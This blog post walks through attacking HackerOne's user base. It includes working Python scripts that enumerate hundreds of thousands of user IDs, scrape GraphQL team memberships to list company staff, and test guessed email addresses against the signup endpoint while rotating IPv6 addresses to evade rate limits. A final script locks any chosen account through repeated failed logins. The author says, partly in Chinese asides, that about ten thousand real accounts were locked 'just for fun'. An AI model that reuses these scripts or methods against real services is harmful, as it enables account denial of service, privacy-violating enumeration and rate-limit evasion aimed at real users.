---
layout: post
title:  Enum H1 Staff and Users email addresses and Lock accounts
categories: articles
---

<p align="right" class="date">{{ page.date | date_to_string }} - CongRong</p>

I found https://hackerone.com/sitemap.json a few months ago, but saw that only users starting with `a` were returned, but later I found out that it can be accessed via the parameter `first` Enumerate all users:

{% highlight http %}
https://hackerone.com/sitemap.json?first=[a-z]
{% endhighlight %}

After I got the id of nearly 600,000 users, thinking about how to use this data to maximize the harm?

So I thought of three ideas:

1. By requesting the `graphql` interface, query the team that each user belongs to. Reverse this result into: List of companies-> Staff. (Unrestricted)
2. Merge all common email addresses with ids, and enumerate whether the email addresses exists in the registration interface. (Limited, but can be bypassed with more IPv6)
3. Finally, you can use the blasted email addresses to log-in to the interface and request more than 100+ wrong passwords to lock your account. XD

## 0x01 Company -> Staff:

{% highlight python %}
#!/usr/bin/env python
#coding:utf-8

import os
import time
import json
import string
import requests

def main(name):
    print name
    datas = {"operationName":"getTeams","variables":{"username":"{}".format(name)},"query":"query getTeams($username: String!) {\n  user(username: $username) {\n    memberships(first: 10, where: {concealed: {_eq: false}}) {\n      total_count\n      edges {\n        node {\n          id\n          team {\n            id\n            name\n            handle\n            state\n            profile_picture(size: small)\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}

    headers={
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0",
        "content-type": "application/json",
        "x-auth-token": "----",
        "Connection": "close"
    }
    try:
        r = requests.post("https://hackerone.com/graphql",headers=headers , data=json.dumps(datas), timeout=5)
        ret = json.loads(r.content)['data']['user']['memberships']
        if isinstance(ret['total_count'],int):
            f = open("done.txt",'a')
            f.write(name + '\n')
            f.close()

            if ret['total_count'] != 0:
                results = {name:[team['node']['team']['handle'] for team in ret['edges']]}
                print results
                with open("results/{}.txt".format(name),'w') as fp:
                    json.dump(results, fp, indent=4, ensure_ascii=False)
    except Exception,e:
        print e

if __name__ == '__main__':
    done = [i.strip() for i in open("done.txt")]
    for i in string.lowercase:
        with open("{}.txt".format(i)) as f:
            jf = json.load(f)
            for k in jf['users']:
                if k['username'] not in done:
                    ret = main(k['username'])
{% endhighlight %}

![](https://statics.symbo1.com/file/symbo1/article-images/aa2.png)

After reversing, the staff corresponding to the company is generated:

{% highlight python %}
#coding:utf-8

import os
import json
import string

def main():
	companys = {}
	staffs = os.listdir('results')
	for sf in filter(lambda x:x[-4:] == '.txt',staffs):
		staff = sf[:-4]
		with open('results/{}'.format(sf)) as f:
			sTmp = json.load(f)
			for c in sTmp.values()[0]:
				if c not in companys.keys():
					companys[c] = []
				companys[c].append(staff)

	profiles = {}

	for i in string.lowercase:
		with open("{}.txt".format(i)) as f:
			jf = json.load(f)
			for k in jf['profiles']:
				profiles[k['handle']] = k['name']

	f = open("staffList.txt",'a')
	f.write("| Company (347) | Staff (3488) |\n| --- | --- |\n")
	for k,v in companys.items():
		inc = profiles[k] if k in profiles.keys() else k
		users = []
		for u in v:
			users.append("[{}](https://hackerone.com/{})".format(u,u))
		f.write('| [{}](https://hackerone.com/{}) | '.format(inc,k) + '、'.join(users) + ' |\n')
	f.close()


if __name__ == '__main__':
	main()
{% endhighlight %}

So I have a list of `347` teams corresponding to `3488` staff XD

<a href="https://github.com/Symbo1/HackerOne-Staffs" target="_blank">https://github.com/Symbo1/HackerOne-Staffs</a>

![](https://statics.symbo1.com/file/symbo1/article-images/aa3.png)

## 0x02 Enumeration email addresses:

Under normal circumstances, the registered API will be frequency-limited, but can be bypassed by adding a large number of IPv6 enumerations:

![](https://statics.symbo1.com/file/symbo1/article-images/aa4.png)

Here only use gmail for testing, in fact, you can also add outlook, yahoo, mail.ru ...

{% highlight python %}
import json
import random
import string
import requests
import netifaces
from gevent import monkey
from gevent.pool import Pool
from requests_toolbelt.adapters import source

monkey.patch_all()
interfaces = 'ens3'

ips = []
for ipv6 in netifaces.ifaddresses(interfaces)[netifaces.AF_INET6]:
	if not ipv6['addr'].split(':')[0] == "fe80":
		ips.append(ipv6['addr'].split('%')[0])

def main(username):
	print username
	email = "{}@gmail.com".format(username)
	datas = {
		"user[email]": email
	}

	headers={
		"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0",
		"Accept":"application/json, text/javascript, */*; q=0.01",
		"X-CSRF-Token":"...",
		"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
		"X-Requested-With":"XMLHttpRequest",
		"Cookie": "...",
		"Connection":"keep-alive"
	}
	try:

		s = requests.Session()
		new_source = source.SourceAddressAdapter(random.choice(ips))
		s.mount('http://', new_source)
		s.mount('https://', new_source)

		r = s.post("https://hackerone.com/users",headers=headers , data=datas, timeout=5)
		ret = json.loads(r.content)["errors"]
		if ret:
			f = open("email-done.txt",'a')
			f.write(username + '\n')
			f.close()
			if "email" in ret.keys():
				print email
				f = open("emails.txt",'a')
				f.write(email + '\n')
				f.close()
	except Exception,e:
		print e

if __name__ == '__main__':
	tasks = []
	done = [i.strip() for i in open("email-done.txt")]
	for i in string.lowercase[:1]:
		with open("{}.txt".format(i)) as f:
			jf = json.load(f)
			for k in jf['users']:
				if k['username'] not in done:
					tasks.append(k['username'])
	pool = Pool(20)
	pool.map(main, tasks)
{% endhighlight %}

![](https://statics.symbo1.com/file/symbo1/article-images/aa5.png)

After enumerating `30k+` ID's I stopped the testing, and `2887` of them returned with success: (ps. emmmm悄悄的说，后来我获取到了几万)

![](https://statics.symbo1.com/file/symbo1/article-images/aa0.png)

As such, for total `600k` ID's, we may be able to get at least tens thousands of valid email addresses.

## 0x03 Lock accounts:

{% highlight python %}
import sys
import random
import string
import requests
import netifaces
from gevent import monkey
from gevent.pool import Pool
from requests_toolbelt.adapters import source

monkey.patch_all()
interfaces = 'ens3'

ips = []
for ipv6 in netifaces.ifaddresses(interfaces)[netifaces.AF_INET6]:
	if not ipv6['addr'].split(':')[0] == "fe80":
		ips.append(ipv6['addr'].split('%')[0])

def main(email):
	datas = {
		"email":email,
		"password":''.join(random.sample(string.lowercase,10)),
		"remember_me":"false"
	}

	headers={
		"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0",
		"Accept":"application/json, text/javascript, */*; q=0.01",
		"X-CSRF-Token":"...",
		"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
		"X-Requested-With":"XMLHttpRequest",
		"Cookie": "...",
		"Connection":"keep-alive"
	}
	try:

		s = requests.Session()
		new_source = source.SourceAddressAdapter(random.choice(ips))
		s.mount('http://', new_source)
		s.mount('https://', new_source)

		r = s.post("https://hackerone.com/sessions",headers=headers , data=datas, timeout=5)
		print "password: {} {}".format(datas['password'],r.content)
	except Exception,e:
		print e

if __name__ == '__main__':
	tasks = [sys.argv[1]]*110
	pool = Pool(20)
	pool.map(main, tasks)
{% endhighlight %}

![](https://statics.symbo1.com/file/symbo1/article-images/aa7.png)

After 100+ login attempts with incorrect passwords, the account was locked out successfully.

![](https://statics.symbo1.com/file/symbo1/article-images/aa6.png)

If I want to lock someone's account, I just need to enumerate the email addresses and then loop the script. Because the session will be invalidated after being locked, and the `unlock token` is unique each time it is locked.

## 0x04 End.

后来的故事就是封了万个号，h1官方进行了修正，并向被锁账号们群发了该事件的邮件：

![](https://statics.symbo1.com/file/symbo1/article-images/aa10.png)

Just For Fun :]